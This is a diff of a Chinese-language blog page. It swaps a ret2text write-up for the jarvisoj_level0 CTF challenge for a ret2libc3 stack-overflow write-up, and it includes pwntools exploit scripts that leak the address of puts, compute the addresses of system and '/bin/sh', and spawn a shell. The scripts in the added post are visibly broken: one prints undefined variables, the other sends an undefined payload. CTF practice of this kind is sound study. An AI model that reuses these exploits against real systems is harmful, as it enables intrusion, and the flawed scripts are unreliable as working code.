@@ -22,28 +22,32 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"lmarch2.github.com","root":"/","images":"/images","scheme":"Gemini","darkmode":"ture","version":"8.14.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="Week4&amp;&amp;Week5 T1  jarvisoj_level02023-01-20WPBUUCTF pwn 第六题考点： 简单栈溢出&#x2F;基本rop ret2text">
+    <meta name="description" content="T4 ret2libc3 2021-01-30WPctf-wiki ret2libc3考点：栈溢出rop">
 <meta property="og:type" content="article">
-<meta property="og:title" content="week4 T1">
-<meta property="og:url" content="http://lmarch2.github.com/posts/64ef4d6b/index.html">
+<meta property="og:title" content="week4&amp;&amp;week5-T4">
+<meta property="og:url" content="http://lmarch2.github.com/posts/e234b4c5/index.html">
 <meta property="og:site_name" content="lmarch2&#39;blog">
-<meta property="og:description" content="Week4&amp;&amp;Week5 T1  jarvisoj_level02023-01-20WPBUUCTF pwn 第六题考点： 简单栈溢出&#x2F;基本rop ret2text">
+<meta property="og:description" content="T4 ret2libc3 2021-01-30WPctf-wiki ret2libc3考点：栈溢出rop">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-01-20T15:36:57.000Z">
-<meta property="article:modified_time" content="2023-04-01T07:30:57.754Z">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-39081f4041a6adc22d72564532642699_1440w.webp">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/fe4f5738bcd04e6fbe3cd80ed056f189.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/66db2c69d62a4149868ab50a5c933698.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="article:published_time" content="2023-04-01T07:35:47.000Z">
+<meta property="article:modified_time" content="2023-04-01T07:42:41.099Z">
 <meta property="article:author" content="lmarch2">
-<meta property="article:tag" content="ctf BUUCTF">
+<meta property="article:tag" content="ctf ctf-wiki">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic2.zhimg.com/80/v2-39081f4041a6adc22d72564532642699_1440w.webp">
 
 
-<link rel="canonical" href="http://lmarch2.github.com/posts/64ef4d6b/">
+<link rel="canonical" href="http://lmarch2.github.com/posts/e234b4c5/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://lmarch2.github.com/posts/64ef4d6b/","path":"posts/64ef4d6b/","title":"week4 T1"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://lmarch2.github.com/posts/e234b4c5/","path":"posts/e234b4c5/","title":"week4&&week5-T4"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>week4 T1 | lmarch2'blog</title>
+<title>week4&&week5-T4 | lmarch2'blog</title>
   
 
 
@@ -143,7 +147,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Week4-amp-amp-Week5-T1-jarvisoj-level0"><span class="nav-text">Week4&amp;&amp;Week5 T1  jarvisoj_level0</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01"><span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02"><span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03"><span class="nav-text">0x03</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#T4-ret2libc3"><span class="nav-text">T4 ret2libc3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01"><span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02"><span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03"><span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04"><span class="nav-text">0x04</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05"><span class="nav-text">0x05</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -290,7 +294,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://lmarch2.github.com/posts/64ef4d6b/">
+    <link itemprop="mainEntityOfPage" href="http://lmarch2.github.com/posts/e234b4c5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="https://pic3.zhimg.com/80/v2-ffbdad5d2f9183a625a6a112a4f96b02_1440w.webp">
@@ -303,12 +307,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="week4 T1 | lmarch2'blog">
+      <meta itemprop="name" content="week4&&week5-T4 | lmarch2'blog">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          week4 T1
+          week4&&week5-T4
         </h1>
 
         <div class="post-meta-container">
@@ -318,15 +322,9 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2023-01-20 23:36:57" itemprop="dateCreated datePublished" datetime="2023-01-20T23:36:57+08:00">2023-01-20</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-04-01 15:30:57" itemprop="dateModified" datetime="2023-04-01T15:30:57+08:00">2023-04-01</time>
+      <time title="创建时间：2023-04-01 15:35:47 / 修改时间：15:42:41" itemprop="dateCreated datePublished" datetime="2023-04-01T15:35:47+08:00">2023-04-01</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -352,14 +350,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>395</span>
+      <span>2.6k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
+      <span>2 分钟</span>
     </span>
 </div>
 
@@ -370,13 +368,32 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="Week4-amp-amp-Week5-T1-jarvisoj-level0"><a href="#Week4-amp-amp-Week5-T1-jarvisoj-level0" class="headerlink" title="Week4&amp;&amp;Week5 T1  jarvisoj_level0"></a>Week4&amp;&amp;Week5 T1  jarvisoj_level0</h2><p>2023-01-20WP<br>BUUCTF pwn 第六题<br>考点： 简单栈溢出&#x2F;基本rop ret2text</p>
+        <h2 id="T4-ret2libc3"><a href="#T4-ret2libc3" class="headerlink" title="T4 ret2libc3"></a>T4 ret2libc3</h2><blockquote>
+<p>2021-01-30WP<br>ctf-wiki ret2libc3<br>考点：栈溢出rop</p>
+</blockquote>
 <span id="more"></span>
 
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec —— 64-bit，开NX</p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA查看发现main函数里的vulnerable_function()函数里的read函数读取0x200ull，而buf空间只有0x80<br>又找到有system(“&#x2F;bin&#x2F;sh”)<br>返回其地址</p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><strong>exp</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,29175)</span><br><span class="line">ret_arr = 0X40059A</span><br><span class="line">payload = b&#x27;a&#x27;*(0x80 + 0x8) + p64(ret_arr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>这个是真的难……  首先得透彻理解got和plt，其次还得对exp的写作要有一定的熟练度，而且还有各种各样古怪的写法…… 现在我还很多地方琢磨不清楚，只是依葫芦画瓢地复盘了一下，现在这篇题解只是写个大框架，具体细节后面慢慢补充了……</p>
+<p>file checksec —— 32-bit 开NX</p>
+<p><img data-src="https://pic2.zhimg.com/80/v2-39081f4041a6adc22d72564532642699_1440w.webp"></p>
+<p>漏洞和内存分析和之前的系列题类似，不赘述了</p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA看源码，既没有system也没有binsh </p>
+<p><img data-src="https://img-blog.csdnimg.cn/fe4f5738bcd04e6fbe3cd80ed056f189.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>由linux延迟绑定机制的知识（后面再写一篇总结吧）可知，我们如果要调用system函数，就要知道他的got表中的地址，但libc被加载到的内存的位置是随机的，我们无法得知<br>不过，同一版本的libc的两个库函数在libc中的相对位置是不变的，所以如果我们可以知道一个已经执行过的函数的got表地址，然后确定libc的版本，就可以加上和system函数的偏移，从而得到system函数的真实地址（got表地址）<br>而现在我们有一个puts函数，libc中也有system和binsh</p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>我们只需要通过栈溢出利用puts函数，打印puts函数的got表中的地址，然后获取偏移，得到system函数和&#x2F;bin&#x2F;sh字符串的地址，再将puts函数的返回地址覆盖为system函数的地址即可<br>我们可以先运行exp1（见0x04）拿到获取puts的真实地址，然后去<a target="_blank" rel="noopener" href="https://libc.blukat.me/?q=__libc_start_main_ret:e81">libc- database -search的网站</a>查询，可得到puts函数system函数和binsh字符串对应的偏移地址</p>
+<p><img data-src="https://img-blog.csdnimg.cn/66db2c69d62a4149868ab50a5c933698.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16"><br>（这里直接盗图了……）</p>
+<p>知道了puts函数的真实地址和偏移之后，就可以将puts函数的真实地址减去偏移地址，得到libc的基址，将libc的基址分别与system，&#x2F;bin&#x2F;sh字符串的偏移相加，就可以得到对应的真实地址<br>然后写完整的exp </p>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>所以其实exp是分两部的，第一步是构造栈溢出利用puts函数打印出真实地址；第二步是溢出覆盖至system函数和&#x2F;bin&#x2F;sh的地址，拿到shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#first exp</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;ret2libc3&#x27;)</span><br><span class="line">p=process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">start_addr = elf.symbols[&#x27;_start&#x27;]</span><br><span class="line">payload1=b&#x27;A&#x27;*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;!?&quot;,payload1)</span><br><span class="line">puts_addr=u32(p.recv(4))</span><br><span class="line"></span><br><span class="line">print(&quot;puts_got_addr = &quot;,hex(puts_got_addr))</span><br><span class="line">print(&quot;puts_plt_addr = &quot;,hex(puts_plt_addr))</span><br><span class="line">print(&quot;main_plt_addr = &quot;,hex(main_plt_addr))</span><br><span class="line">print(&quot;puts addr = &quot;, hex(puts_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#second exp</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">elf = ELF(&#x27;./ret2libc3&#x27;)</span><br><span class="line"></span><br><span class="line">puts_got_addr = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt_addr = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">main_plt_addr = elf.symbols[&#x27;_start&#x27;]</span><br><span class="line"></span><br><span class="line">print(&quot;puts_got_addr = &quot;,hex(puts_got_addr))</span><br><span class="line">print(&quot;puts_plt_addr = &quot;,hex(puts_plt_addr))</span><br><span class="line">print(&quot;main_plt_addr = &quot;,hex(main_plt_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line">print(&quot;puts_addr = &quot;,hex(puts_addr))</span><br><span class="line">sys_offset = 0x03cd10</span><br><span class="line">puts_offset = 0x067360</span><br><span class="line">sh_offset = 0x17b8cf</span><br><span class="line"></span><br><span class="line">#根据公式  libc基地址  +  函数偏移量   =  函数真实地址   来计算</span><br><span class="line">libc_base_addr = puts_addr - puts_offset #计算出libc基地址</span><br><span class="line">sys_addr = libc_base_addr + sys_offset #计算出system的真实地址</span><br><span class="line">sh_addr = libc_base_addr + sh_offset #计算出/bin/sh的真实地址</span><br><span class="line"></span><br><span class="line">print(&quot;libc_base_addr = &quot;,hex(libc_base_addr))</span><br><span class="line">print(&quot;sys_addr = &quot;,hex(sys_addr))</span><br><span class="line">print(&quot;sh_addr = &quot;,hex(sh_addr))</span><br><span class="line"></span><br><span class="line">payload2 = flat([b&#x27;A&#x27;*112, p32(sys_addr), &quot;AAAA&quot;, p32(sh_addr)])</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>还有其他几种方法目前没用搞懂<br>之后学会了（看懂了）再写过<br><strong>问</strong>：</p>
+<blockquote>
+<p>p.recv()[0:4]和p.recv(4）的区别？？<br>网上没搜到<br>要在本地打通是不是要对libc做什么操作呀</p>
+</blockquote>
+<p>参考资料：<br>  <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45943522/article/details/120469196">pwn小白入门06–ret2libc</a><br>  <a target="_blank" rel="noopener" href="https://blog.csdn.net/AcSuccess/article/details/104335514">基本ROP之ret2libc3</a><br>  <a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/ug9gx5#MsLuY">yichen二进制安全</a></p>
+
     </div>
 
     
@@ -403,7 +420,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="http://lmarch2.github.com/posts/64ef4d6b/" title="week4 T1">http://lmarch2.github.com/posts/64ef4d6b/</a>
+      <a href="http://lmarch2.github.com/posts/e234b4c5/" title="week4&amp;&amp;week5-T4">http://lmarch2.github.com/posts/e234b4c5/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -414,7 +431,7 @@
           <div class="post-tags">
 
  <div class="post-tags">
-              <a href="/tags/ctf-BUUCTF/" rel="tag"><i class="fa fa-tag"></i> ctf BUUCTF</a>
+              <a href="/tags/ctf-ctf-wiki/" rel="tag"><i class="fa fa-tag"></i> ctf ctf-wiki</a>
           </div>
           <script type="text/javascript">
             var tagsall=document.getElementsByClassName("post-tags")
@@ -473,20 +490,20 @@
             </script>
 
 
-              <a href="/tags/ctf-BUUCTF/" rel="tag"><i class="fa fa-tag"></i> ctf BUUCTF</a>
+              <a href="/tags/ctf-ctf-wiki/" rel="tag"><i class="fa fa-tag"></i> ctf ctf-wiki</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/posts/fe55b1cb/" rel="prev" title="week3 T5">
-                  <i class="fa fa-chevron-left"></i> week3 T5
+                <a href="/posts/7c502166/" rel="prev" title="week4&&week5-T3">
+                  <i class="fa fa-chevron-left"></i> week4&&week5-T3
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/posts/0/" rel="next" title="关于分配动态内存编译器警告C6001和C6011">
-                  关于分配动态内存编译器警告C6001和C6011 <i class="fa fa-chevron-right"></i>
+                <a href="/posts/95338453/" rel="next" title="week4&&week5-T5">
+                  week4&&week5-T5 <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
